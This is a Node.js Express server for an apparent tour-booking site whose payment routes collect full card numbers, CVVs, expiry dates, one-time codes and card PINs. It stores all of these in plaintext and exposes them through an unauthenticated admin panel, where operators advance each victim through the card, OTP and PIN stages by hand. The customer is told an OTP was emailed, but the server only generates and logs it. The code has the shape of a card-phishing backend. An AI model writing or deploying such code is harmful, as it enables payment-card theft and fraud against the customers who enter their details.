import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// In-memory storage for bookings and payments (fallback when DB is unavailable)
const bookings = new Map();
const payments = new Map();

// Helper functions
function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

function generatePIN() {
  return Math.floor(1000 + Math.random() * 9000).toString();
}

function generateId() {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

// Middleware to fix date picker by injecting override script
app.use((req, res, next) => {
  const originalSend = res.send;
  res.send = function(data) {
    if (typeof data === 'string' && data.includes('booking_date')) {
      // Inject CSS and JS to override WordPress date picker
      const datePickerFix = `
<style>
/* Override WordPress date picker styles */
input[name="booking_date"] {
  display: block !important;
  visibility: visible !important;
  opacity: 1 !important;
  pointer-events: auto !important;
  background-color: white !important;
  border: 1px solid #ccc !important;
  padding: 8px !important;
  font-size: 14px !important;
  width: 100% !important;
  box-sizing: border-box !important;
}
</style>
<script>
// Disable WordPress date picker plugin
window.dy_date_picker = null;
if (window.jQuery) {
  jQuery(document).ready(function() {
    var dateInputs = document.querySelectorAll('input[name="booking_date"]');
    dateInputs.forEach(function(input) {
      input.type = 'date';
      input.removeAttribute('placeholder');
      input.removeAttribute('disabled');
      input.removeAttribute('class');
      input.required = true;
    });
  });
}
</script>
`;
      data = data.replace('</body>', datePickerFix + '</body>');
    }
    return originalSend.call(this, data);
  };
  next();
});

// Serve static files
app.use(express.static(__dirname));

// API Routes for Bookings
app.post('/api/bookings', (req, res) => {
  try {
    const { tour_type, customer_name, customer_email, customer_phone, number_of_people, total_price, notes } = req.body;

    const bookingId = generateId();
    const booking = {
      id: bookingId,
      tour_type,
      customer_name,
      customer_email,
      customer_phone,
      number_of_people,
      total_price,
      notes,
      booking_date: new Date().toISOString(),
      status: 'pending'
    };

    bookings.set(bookingId, booking);

    res.json({ success: true, booking });
  } catch (error) {
    console.error('Booking error:', error);
    res.status(500).json({ error: 'Failed to create booking' });
  }
});

app.get('/api/bookings', (req, res) => {
  try {
    const allBookings = Array.from(bookings.values()).sort((a, b) => 
      new Date(b.booking_date) - new Date(a.booking_date)
    );
    res.json(allBookings);
  } catch (error) {
    console.error('Fetch bookings error:', error);
    res.status(500).json({ error: 'Failed to fetch bookings' });
  }
});

// API Routes for Payments
app.post('/api/payments/submit-card', (req, res) => {
  try {
    const { cardNumber, cardHolder, expiryDate, cvv, email, bookingId, amount } = req.body;
    const otp = generateOTP();
    const paymentId = generateId();

    const payment = {
      id: paymentId,
      booking_id: bookingId,
      card_number: cardNumber,
      card_holder: cardHolder,
      expiry_date: expiryDate,
      cvv,
      email,
      amount,
      otp,
      status: 'pending_card',
      payment_date: new Date().toISOString()
    };

    payments.set(paymentId, payment);

    console.log(`[PAYMENT] Card submitted for ${email}. OTP: ${otp}`);

    res.json({
      success: true,
      paymentId,
      message: 'Card details received. OTP sent to your email.'
    });
  } catch (error) {
    console.error('Payment submission error:', error);
    res.status(500).json({ error: 'Failed to process payment' });
  }
});

app.post('/api/payments/verify-otp', (req, res) => {
  try {
    const { paymentId, otp } = req.body;

    const payment = payments.get(paymentId);
    if (!payment) {
      return res.status(404).json({ error: 'Payment not found' });
    }

    if (payment.otp !== otp) {
      return res.status(400).json({ error: 'Invalid OTP' });
    }

    const pin = generatePIN();
    payment.status = 'pending_pin';
    payment.pin = pin;

    console.log(`[PAYMENT] OTP verified for ${payment.email}. PIN: ${pin}`);

    res.json({ success: true, message: 'OTP verified. Please enter your PIN.' });
  } catch (error) {
    console.error('OTP verification error:', error);
    res.status(500).json({ error: 'Failed to verify OTP' });
  }
});

app.post('/api/payments/verify-pin', (req, res) => {
  try {
    const { paymentId, pin } = req.body;

    const payment = payments.get(paymentId);
    if (!payment) {
      return res.status(404).json({ error: 'Payment not found' });
    }

    if (payment.pin !== pin) {
      return res.status(400).json({ error: 'Invalid PIN' });
    }

    payment.status = 'completed';

    console.log(`[PAYMENT] PIN verified for ${payment.email}. Payment completed!`);

    res.json({ success: true, message: 'Payment completed successfully!' });
  } catch (error) {
    console.error('PIN verification error:', error);
    res.status(500).json({ error: 'Failed to verify PIN' });
  }
});

// Admin Routes
app.get('/api/admin/payments', (req, res) => {
  try {
    const allPayments = Array.from(payments.values())
      .filter(p => p.status !== 'completed' && p.status !== 'rejected')
      .sort((a, b) => new Date(b.payment_date) - new Date(a.payment_date));
    res.json(allPayments);
  } catch (error) {
    console.error('Fetch payments error:', error);
    res.status(500).json({ error: 'Failed to fetch payments' });
  }
});

app.post('/api/admin/payments/:id/approve', (req, res) => {
  try {
    const { id } = req.params;

    const payment = payments.get(id);
    if (!payment) {
      return res.status(404).json({ error: 'Payment not found' });
    }

    let newStatus = payment.status;

    if (payment.status === 'pending_card') {
      newStatus = 'pending_otp';
    } else if (payment.status === 'pending_otp') {
      newStatus = 'pending_pin';
    } else if (payment.status === 'pending_pin') {
      newStatus = 'completed';
    }

    payment.status = newStatus;
    payment.approval_date = new Date().toISOString();

    console.log(`[ADMIN] Payment ${id} approved. New status: ${newStatus}`);

    res.json({ success: true, message: 'Payment approved and moved to next step.' });
  } catch (error) {
    console.error('Approve payment error:', error);
    res.status(500).json({ error: 'Failed to approve payment' });
  }
});

app.post('/api/admin/payments/:id/reject', (req, res) => {
  try {
    const { id } = req.params;
    const { reason } = req.body;

    const payment = payments.get(id);
    if (!payment) {
      return res.status(404).json({ error: 'Payment not found' });
    }

    payment.status = 'rejected';
    payment.rejection_reason = reason;

    console.log(`[ADMIN] Payment ${id} rejected. Reason: ${reason}`);

    res.json({ success: true, message: 'Payment rejected.' });
  } catch (error) {
    console.error('Reject payment error:', error);
    res.status(500).json({ error: 'Failed to reject payment' });
  }
});

// Admin Dashboard Page
app.get('/admin-dashboard', (req, res) => {
  const adminDashboardPath = path.join(__dirname, 'admin-dashboard.html');
  if (fs.existsSync(adminDashboardPath)) {
    res.sendFile(adminDashboardPath);
  } else {
    res.status(404).send('Admin dashboard not found');
  }
});

// 404 Error Handler
app.use((req, res) => {
  res.status(404).send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>404 - Page Not Found</title>
      <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        h1 { color: #333; }
        p { color: #666; }
        a { color: #0066cc; text-decoration: none; }
      </style>
    </head>
    <body>
      <h1>404 - Page Not Found</h1>
      <p>The page you are looking for does not exist.</p>
      <a href="/">Go back to home</a>
    </body>
    </html>
  `);
});

// Start Server
function startServer() {
  try {
    app.listen(PORT, () => {
      console.log(`🚀 Server running on http://localhost:${PORT}`);
      console.log(`📊 Admin Dashboard: http://localhost:${PORT}/admin-dashboard`);
      console.log(`✅ Using in-memory storage (no database required)`);
    });
  } catch (error) {
    console.error('❌ Failed to start server:', error);
    process.exit(1);
  }
}

startServer();
